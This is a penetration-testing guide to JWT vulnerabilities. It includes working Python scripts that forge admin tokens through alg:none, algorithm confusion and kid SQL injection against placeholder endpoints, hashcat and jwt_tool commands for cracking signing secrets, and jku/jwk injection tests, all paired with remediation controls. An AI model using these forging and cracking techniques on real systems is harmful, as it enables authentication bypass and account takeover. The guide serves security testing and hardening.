JSON Web Tokens are everywhere. They're also broken in production more often than any other authentication mechanism — because the JWT specification gives developers dozens of ways to get it catastrophically wrong.

From algorithm confusion that lets attackers forge tokens signed with the server's public key, to weak secrets crackable in seconds with a $50 GPU, JWT vulnerabilities are consistently among the highest-severity findings in API security assessments. Yet most developers have never systematically tested their JWT implementation.

This guide gives you a structured, end-to-end testing methodology — covering all major JWT attack classes, with step-by-step procedures, Burp Suite workflows, Python exploit scripts, and concrete remediation controls mapped to each vulnerability.

// JWT_ANATOMY
PREREQUISITE
JWT ANATOMY

Before attacking, understand what you're attacking.

A JWT is three Base64URL-encoded JSON objects joined by dots: header.payload.signature. The header specifies the algorithm. The payload carries claims. The signature proves integrity — and it's the primary attack target.

// DECODED JWT STRUCTURE // 1. HEADER — tells the server HOW to verify { "alg": "HS256", ← ATTACK SURFACE: can be manipulated "typ": "JWT" } // 2. PAYLOAD — claims about the user { "sub": "user_123", "role": "user", ← privilege escalation target "iat": 1710840000, "exp": 1710843600 ← expiry bypass target } // 3. SIGNATURE — HMAC-SHA256(base64(header) + "." + base64(payload), secret) SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
ℹ️
Key insight: The header and payload are NOT encrypted — they're only Base64URL encoded. Any user can decode them. This means an attacker can read every claim in a JWT without any key material. Sensitive data in JWT payloads is fully exposed.

// ATTACK_CLASS_01
JWT-01 Critical
ALGORITHM NONE ATTACK

Removing the signature entirely by setting alg to "none" — the oldest and most devastating JWT vulnerability.

The JWT specification allows the algorithm value "none" to indicate an "unsecured JWT" with no signature. Vulnerable libraries that honour this value allow an attacker to forge any token with any payload — simply by setting alg: none and dropping the signature.

import base64, json, requests def b64url_encode(data): return base64.urlsafe_b64encode(data).rstrip(b'=').decode() # Original token (captured from Burp) original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # Step 1: Forge header with alg: none (try all variants) alg_variants = ["none", "None", "NONE", "nOnE"] for alg in alg_variants: header = {"alg": alg, "typ": "JWT"} payload = {"sub": "admin", "role": "admin", "exp": 9999999999} h64 = b64url_encode(json.dumps(header).encode()) p64 = b64url_encode(json.dumps(payload).encode()) # No signature — just header.payload. (trailing dot required by some libs) forged = f"{h64}.{p64}." resp = requests.get( "https://target.com/api/admin", headers={"Authorization": f"Bearer {forged}"} ) print(f"alg={alg}: {resp.status_code} {resp.text[:80]}")

A 200 response with the forged admin token confirms a Critical finding. This vulnerability allows complete authentication bypass and full privilege escalation — no key material required. Escalate immediately.

// ATTACK_CLASS_02
JWT-02 Critical
ALGORITHM CONFUSION (RS256→HS256)

Tricking an asymmetric-key server into verifying a token with its own public key used as an HMAC secret.

When a server uses RS256 (asymmetric), it signs with a private key and verifies with the public key. If the library accepts any algorithm the client specifies, an attacker can switch to HS256 (symmetric) and sign the token using the server's public key as the HMAC secret — which the attacker can obtain from the /jwks.json endpoint.

Python alg_confusion.py
import jwt, requests from cryptography.hazmat.primitives import serialization # Step 1: Retrieve the public key from JWKS endpoint jwks = requests.get("https://target.com/.well-known/jwks.json").json() # Step 2: Extract and convert public key to PEM bytes from jwt.algorithms import RSAAlgorithm public_key = RSAAlgorithm.from_jwk(jwks['keys'][0]) public_key_pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) # Step 3: Sign a forged payload using the PUBLIC key as HMAC secret forged_payload = { "sub": "admin", "role": "administrator", "exp": 9999999999 } forged_token = jwt.encode( forged_payload, public_key_pem, ← using PUBLIC key as HMAC secret algorithm="HS256" ← server was expecting RS256 ) # Step 4: Send forged token — server verifies HS256 with its own public key r = requests.get( "https://target.com/api/admin/users", headers={"Authorization": f"Bearer {forged_token}"} ) print(r.status_code, r.text[:200])
🔴
Remediation: The server must explicitly whitelist the expected algorithm — never trust the alg field from the client token. Use algorithms=["RS256"] (not algorithms=["RS256","HS256"]) in your JWT library's verify call.
// ATTACK_CLASS_03
JWT-03 Critical
WEAK SECRET BRUTE-FORCE

Cracking the HMAC signing secret offline using hashcat or jwt_tool — no server interaction required after the token is captured.

HMAC-signed JWTs (HS256/HS384/HS512) are only as strong as their secret key. Short, default, or dictionary-based secrets can be cracked offline at billions of guesses per second using a GPU. An attacker needs only a single valid JWT to begin cracking — no server lockout mechanism applies.

Bash crack_secret.sh
# Method 1: hashcat — fastest, GPU-accelerated $ hashcat -a 0 -m 16500 captured_token.txt /usr/share/wordlists/rockyou.txt # Method 2: hashcat with rules for variations $ hashcat -a 0 -m 16500 captured_token.txt wordlist.txt -r rules/best64.rule # Method 3: jwt_tool built-in cracker $ python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt # Method 4: brute-force short secrets (1-6 chars) $ python3 jwt_tool.py <TOKEN> -C -p "secret" # test specific value $ python3 jwt_tool.py <TOKEN> -C -p "password" $ python3 jwt_tool.py <TOKEN> -C -p "jwt_secret" # Common weak secrets to always test manually: # secret, password, 123456, qwerty, jwt, changeme, # your-256-bit-secret, supersecret, [app_name], [domain] >>> [+] secret found: "mysecret123" >>> Use this to forge tokens: jwt.encode(payload, "mysecret123", algorithm="HS256")
⚠️
Once the secret is cracked, you can forge tokens for ANY user — including admin accounts — by simply encoding a new payload with the known secret. Document the cracked secret and the time taken as evidence of inadequate key strength.
// ATTACK_CLASS_04
JWT-04 Critical
KEY ID (kid) INJECTION

Manipulating the kid header to perform SQL injection, path traversal, or SSRF in the key lookup mechanism.

The kid (Key ID) header parameter tells the server which key to use for verification. If the server uses the kid value in a database query or file path lookup without sanitization, this becomes a classical injection point — with the added bonus that a successful SQLi lets you control the signing key itself.

01
SQL Injection via kid header
Set kid to a SQLi payload that forces the key lookup to return a known value, then sign the token with that value.
Manual + Burp
02
Path Traversal via kid header
Set kid to ../../dev/null or a predictable file to control the signing key content.
jwt_tool -T
03
SSRF via jku / x5u headers
Point jku to an attacker-controlled JWKS endpoint hosting a self-generated key pair.
Burp Collaborator
Python kid_sqli.py
import jwt, json, base64, hmac, hashlib # SQLi payload: force the DB to return our known string as the key # Assumes server runs: SELECT key FROM keys WHERE kid = ? sqli_kid = "x' UNION SELECT 'hacked_secret' -- " our_key = "hacked_secret" ← what the SQL returns # Build forged token with malicious kid and sign with our known key header = {"alg": "HS256", "typ": "JWT", "kid": sqli_kid} payload = {"sub": "admin", "role": "admin"} def b64url(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode() h = b64url(json.dumps(header, separators=(',',':')).encode()) p = b64url(json.dumps(payload, separators=(',',':')).encode()) sig_input = f"{h}.{p}".encode() sig = b64url(hmac.new(our_key.encode(), sig_input, hashlib.sha256).digest()) forged = f"{h}.{p}.{sig}" print(f"Forged token:\n{forged}") # Also test path traversal: kid = "../../dev/null" # Sign with empty string — /dev/null is empty pt_header = {"alg": "HS256", "kid": "../../dev/null"}

Modifying exp, iat, nbf, and privilege-bearing claims when signature validation is absent or misconfigured.

Send a token with exp in the past. Server should return 401. If 200 — expiry is not validated.

Set nbf (not before) far in the future. Compliant servers should reject the token as not yet valid.

// ATTACK_CLASS_06_09
JWT-06 → JWT-09
FURTHER ATTACK CLASSES

Additional vulnerability classes requiring testing in every JWT engagement.

ID Vulnerability Severity Description & Test Approach
JWT-06 JWK Header Injection Critical Embed a self-generated public key directly in the jwk header parameter. Vulnerable servers use the attacker-supplied key to verify. Test: include "jwk": {...attacker_pub_key...} in header.
JWT-07 jku SSRF / Header Injection Critical Set jku to an attacker-controlled URL hosting a crafted JWKS. Server fetches and uses attacker's public key. Detect with Burp Collaborator. Test URL bypass: use redirects, CNAME tricks, @ characters.
JWT-08 Token Not Revoked on Logout High Log out, then replay the captured pre-logout token. If accepted, the application lacks server-side revocation. Test all token types: access token, refresh token, session token.
JWT-09 Sensitive Data in Payload Medium Decode the JWT payload and inspect all claims. PII, internal IDs, email addresses, roles, or system info in unencrypted payloads are an information disclosure finding. Note: JWS ≠ JWE (encrypted JWT).
// SECURE_VS_VULNERABLE
ANALYSIS
SECURE vs VULNERABLE CONFIGURATIONS
❌ Vulnerable Implementation
// NEVER DO THIS

jwt.verify(token, secret, {
  // No algorithm whitelist
  // Accepts "none", HS256, RS256...
})

// OR: skipping verification entirely
const payload = jwt.decode(token)
// no .verify() called
✅ Secure Implementation
// ALWAYS whitelist algorithm

jwt.verify(token, secret, {
  algorithms: ["HS256"], // explicit
  issuer: "api.yourapp.com",
  audience: "web-client",
  clockTolerance: 30
})
// Rejects alg:none, RS256, etc.
❌ Weak Secret (Crackable)
SECRET_KEY = "secret"
SECRET_KEY = "password123"
SECRET_KEY = "mysupersecret"
SECRET_KEY = app.name // predictable

// HS256 with < 256-bit key is weak
✅ Strong Secret
// Generate cryptographically random secret
$ openssl rand -hex 64

SECRET_KEY = os.environ["JWT_SECRET"]
// Min 256 bits (32 bytes) for HS256
// Or use RS256/ES256 with proper

// REMEDIATION
REMEDIATION
REMEDIATION CONTROLS
ControlImplementationAddresses
Whitelist algorithm Explicitly specify algorithms=["RS256"] in verify call. Never trust the alg field from the token itself. JWT-01, JWT-02
Use RS256 or ES256 Prefer asymmetric algorithms for JWTs exposed to clients. Keeps the signing key private and uncrackable from token data alone. JWT-03
Strong HMAC secrets Generate secrets with openssl rand -hex 64. Minimum 256 bits for HS256. Store in secrets manager, never in code. JWT-03
Sanitize kid / jku / x5u Validate kid against a whitelist of known key IDs. Never use kid directly in SQL queries or file paths. Block external URLs in jku. JWT-04, JWT-07
Validate all claims Always verify exp, nbf, iss, aud. Reject tokens missing mandatory claims. Never skip expiry validation. JWT-05
Implement token revocation Maintain a server-side blocklist (Redis) of revoked JTIs. Check on every request. Short token lifetimes reduce the revocation window. JWT-08
Never store sensitive data in payload JWT payloads are visible to anyone. Use opaque reference tokens or JWE (encrypted JWT) if sensitive claims are required. JWT-09
✅
Quick wins: The highest-impact single change is adding an explicit algorithm whitelist to your JWT verification call. This alone eliminates algorithm confusion and alg:none attacks — the two most commonly found Critical-severity JWT vulnerabilities in production applications.
